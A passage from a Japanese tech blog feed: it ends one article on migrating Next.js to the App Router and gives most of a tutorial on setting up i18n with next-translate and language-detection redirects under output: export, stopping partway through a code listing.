<p>Next.jsのPages Routerから新しいApp Routerに移行することで、アプリケーションのルーティング機能を強化し、柔軟性を高めることができます。依存関係をアップデートし、ファイル構造を再構築し、新しいデータフェッチとエラーハンドリングの方法に適応することで、App Routerの機能を最大限活用することができます。少し手間はかかりますが、アプリケーションの効率性と拡張性が向上することで明確なメリットが得られます。</p>]]></content:encoded></item><item><title><![CDATA[NextJSのoutput: exportによるi18n]]></title><description><![CDATA[この記事では、Next.jsのプロジェクトにおける国際化対応（i18n）の設定方法について説明します。Next.jsが直接サポートしていない部分の課題を克服しながら、Pages Routerを使用し…]]></description><link>https://postd.cc/i18n-with-nextjs-output-export/</link><guid isPermaLink="false">https://postd.cc/i18n-with-nextjs-output-export/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[Next.js]]></category><pubDate>Mon, 24 Mar 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>この記事では、Next.jsのプロジェクトにおける<strong>国際化対応</strong>（i18n）の設定方法について説明します。<strong>Next.js</strong>が直接サポートしていない部分の課題を克服しながら、Pages Routerを使用してi18nを実装する方法と、output: exportを使用する方法について検討したいと思います。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>国際化ルーティングは、Next.jsのルーティングレイヤーを使用しないため<code class="language-text">output: 'export'</code>では実装できません。<code class="language-text">output: 'export'</code>を使用しないHybrid Next.jsのアプリケーションは完全にサポートされています。</p></div></div>
<p>まず初めに、TypeScriptを使用してNext.js v14のプロジェクトを初期化しましょう。TypeScriptの代わりにJavaScriptを使用することもできます。どちらも問題なく使用できます。</p>
<h2>NextJSプロジェクトの初期化</h2>
<p>次のコマンドを実行してプロジェクトをセットアップしてください。。</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">`npx create-next-app@latest`</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>設定中いくつか質問をされますが、好みで回答してください。筆者の場合はPages Routerを選択し、TypeScriptでsrcディレクトリを指定しました。</p>
<p>次に、next.config.jsファイルに<code class="language-text">output: "export"</code>を追加します。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fffwmsy8pp3fiq4csz80d.png"></p>
<p>さらに、<code class="language-text">output: "export"</code>の構成とは互換性がないため<code class="language-text">pages</code>ディレクトリから<code class="language-text">api</code>フォルダを削除します。</p>
<h2>i18nのインストールと設定</h2>
<p>国際化対応では、<a href="https://www.npmjs.com/package/next-translate">next-translate</a>パッケージを使用します。本来はoutput: exportに対応していませんが、ご心配なく。その点については後ほどサポートします。</p>
<p>まずは<code class="language-text">next-translate</code>パッケージをインストールしてください。</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">`npm i next-translate`</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>プロジェクトのルートレベルに<code class="language-text">i18n.ts</code>または<code class="language-text">.js</code>という名前のファイルを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> I18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next-translate"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> i18nConfig <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">locales</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"en"</span><span class="token punctuation">,</span> <span class="token string">"es"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token literal-property property">defaultLocale</span><span class="token operator">:</span> <span class="token string">"en"</span><span class="token punctuation">,</span>
  <span class="token literal-property property">loader</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token literal-property property">pages</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"*"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"common"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">defaultNS</span><span class="token operator">:</span> <span class="token string">"common"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span> satisfies I18nConfig<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これがi18nのための基本構成になります。必要に応じて自由にカスタマイズしていただいて構いません。</p>
<p>次に、プロジェクトのルートレベルに<code class="language-text">locales</code>フォルダを作成します。このフォルダには、各言語の翻訳ファイルが格納されます。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fjd3m1r3xvj6jfr9tq1o5.png"></p>
<p><code class="language-text">pages</code>ディレクトリ内の<code class="language-text">_app.ts</code>ファイルに移動し、<code class="language-text">I18nProvider</code>で<code class="language-text">Component</code>をラップします。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token string">"@/styles/globals.css"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">type</span> <span class="token punctuation">{</span> AppProps <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/app"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> I18nProvider <span class="token keyword">from</span> <span class="token string">"next-translate/I18nProvider"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> commonES <span class="token keyword">from</span> <span class="token string">"../../locales/es/common.json"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> commonEN <span class="token keyword">from</span> <span class="token string">"../../locales/en/common.json"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">App</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> Component<span class="token punctuation">,</span> pageProps<span class="token punctuation">,</span> router <span class="token punctuation">}</span><span class="token operator">:</span> AppProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> lang <span class="token operator">=</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">)</span>
    <span class="token operator">?</span> <span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span>
    <span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">I18nProvider</span></span>
      <span class="token attr-name">lang</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>lang<span class="token punctuation">}</span></span>
      <span class="token attr-name">namespaces</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">common</span><span class="token operator">:</span> lang <span class="token operator">===</span> <span class="token string">"es"</span> <span class="token operator">?</span> commonES <span class="token operator">:</span> commonEN <span class="token punctuation">}</span><span class="token punctuation">}</span></span>
    <span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Component</span></span> <span class="token spread"><span class="token punctuation">{</span><span class="token operator">...</span>pageProps<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">I18nProvider</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>この手順では以下を行いました。</p>
<ul>
<li><code class="language-text">I18nProvider</code>で<code class="language-text">Component</code>をラップする。</li>
<li>localeというクエリパラメタに指定された文字列から言語を検出し、propsとして<code class="language-text">I18nProvider</code>に渡す。</li>
<li>その言語を基に名前空間ファイルを定義する。</li>
</ul>
<p>次に、<code class="language-text">src/hooks</code>ディレクトリに<code class="language-text">useI18n.ts</code>という名前のカスタムフックを作成し、そこに次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> useTranslation <span class="token keyword">from</span> <span class="token string">"next-translate/useTranslation"</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">IUseI18n</span> <span class="token punctuation">{</span>
  namespace<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useI18n</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> namespace <span class="token punctuation">}</span><span class="token operator">:</span> IUseI18n <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useTranslation</span><span class="token punctuation">(</span>namespace <span class="token operator">?</span> namespace <span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultNS<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>このフックは、設定された名前空間またはデフォルトの名前空間をもとに翻訳を可能にします。</p>
<p>次に、<code class="language-text">pages</code>ディレクトリ内の<code class="language-text">index.tsx</code>ファイルを開き、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useI18n <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/hooks/useI18n"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useI18n</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string">"greeting"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>そうすると、次のような文字が表示されます。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fg0x5w90losm7f8ozuzas.png"></p>
<p>「Hurrah（やった！）」無事プロジェクトにi18nを設定できました。しかし、言語検出がまだ残っています。次はその部分を実装しましょう。</p>
<h2>言語検出</h2>
<p>先ほど見たように、ロケール値は<code class="language-text">router.query</code>から取得していました。
次に進むために、<code class="language-text">pages</code>ディレクトリ内に<code class="language-text">[locale]</code>という名前のフォルダを作成します。
ルートファイルは全てこのフォルダの中に格納されます。
<code class="language-text">[locale]</code>フォルダの中に<code class="language-text">index.tsx</code>ファイルを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useI18n <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/hooks/useI18n"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">Home</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> t <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useI18n</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span><span class="token function">t</span><span class="token punctuation">(</span><span class="token string">"greeting"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Home<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">localhost:3000/en</code>にアクセスするとコンテンツが英語で表示され、<code class="language-text">localhost:3000/es</code>に変えるとスペイン語で表示されます。この機能はダイナミックルートともシームレスに統合します。</p>
<p><code class="language-text">pages</code>フォルダは次のような構造になります。</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F39yib43wqcbuoymyrt4q.png"></p>
<p>では、<a href="https://www.npmjs.com/package/next-language-detector">next-language-detector</a>を使用して言語検出機能を実装し、選択した言語をキャッシュしましょう。
まずはnext-language-detectorをインストールします。</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">npm i next-language-detector</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><code class="language-text">src</code>ディレクトリに<code class="language-text">lib</code>という名前のフォルダを作成し、その中に<code class="language-text">languageDetector.ts</code>という名前のファイルを作成します。ファイルを開き、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token keyword">import</span> nextLanguageDetector <span class="token keyword">from</span> <span class="token string">"next-language-detector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> languageDetector <span class="token operator">=</span> <span class="token function">nextLanguageDetector</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  supportedLngs<span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">,</span>
  fallbackLng<span class="token operator">:</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>同じ<code class="language-text">lib</code>フォルダの中に<code class="language-text">redirect.tsx</code>という名前のファイルを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"./languageDetector"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">useRedirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span>to<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> redirectPath <span class="token operator">=</span> to <span class="token operator">||</span> router<span class="token punctuation">.</span>asPath<span class="token punctuation">;</span>

  <span class="token comment">// language detection</span>
  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>redirectPath<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// prevent endless loop</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> router<span class="token punctuation">.</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> redirectPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>次に、<code class="language-text">pages</code>ディレクトリの中（<code class="language-text">[locale]</code>フォルダの外）にある<code class="language-text">index.tsx</code>ファイルを開き、既存のコードを次のコードに置き換えます。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useRedirect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/redirect"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">Redirect</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token function">useRedirect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Redirect<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これで、ロケールを指定せずにホームページにアクセスを試みたユーザーは、ロケールページにリダイレクトされるようになります。</p>
<p>しかし、<code class="language-text">[locale]</code>フォルダ内の全てのルートについてリダイレクトページを作成するのはあまり効率的ではありません。したがって、ユーザーが言語を指定せずにページにアクセスしようとした場合に特定言語のルートにリダイレクトするLanguageWrapperを作成します。</p>
<p>まずは<code class="language-text">src</code>ディレクトリの中に<code class="language-text">wrappers</code>という名前のフォルダを作成します。このフォルダの中に<code class="language-text">LanguageWrapper.tsx</code>という名前のファイルを作成し、次のコードを挿入します。</p>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> ReactNode<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"next/router"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> languageDetector <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/lib/languageDetector"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> i18nConfig <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"../../i18n"</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">LanguageWrapperProps</span> <span class="token punctuation">{</span>
  children<span class="token operator">:</span> ReactNode<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">LanguageWrapper</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> children <span class="token punctuation">}</span><span class="token operator">:</span> LanguageWrapperProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> detectedLng <span class="token operator">=</span> languageDetector<span class="token punctuation">.</span><span class="token function">detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span>
      query<span class="token operator">:</span> <span class="token punctuation">{</span> locale <span class="token punctuation">}</span><span class="token punctuation">,</span>
      asPath<span class="token punctuation">,</span>
      isReady<span class="token punctuation">,</span>
    <span class="token punctuation">}</span> <span class="token operator">=</span> router<span class="token punctuation">;</span>

    <span class="token comment">// Check if the current route has accurate locale</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>isReady <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>asPath<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> router<span class="token punctuation">.</span>route <span class="token operator">===</span> <span class="token string">"/404"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>detectedLng <span class="token operator">&amp;&amp;</span> languageDetector<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        languageDetector<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span>detectedLng<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> detectedLng <span class="token operator">+</span> asPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>router<span class="token punctuation">,</span> detectedLng<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale <span class="token operator">&amp;&amp;</span>
    i18nConfig<span class="token punctuation">.</span>locales<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>router<span class="token punctuation">.</span>query<span class="token punctuation">.</span>locale<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    router<span class="token punctuation">.</span>asPath<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>detectedLng <span class="token operator">??</span> i18nConfig<span class="token punctuation">.</span>defaultLocale<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token punctuation">{</span>children<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
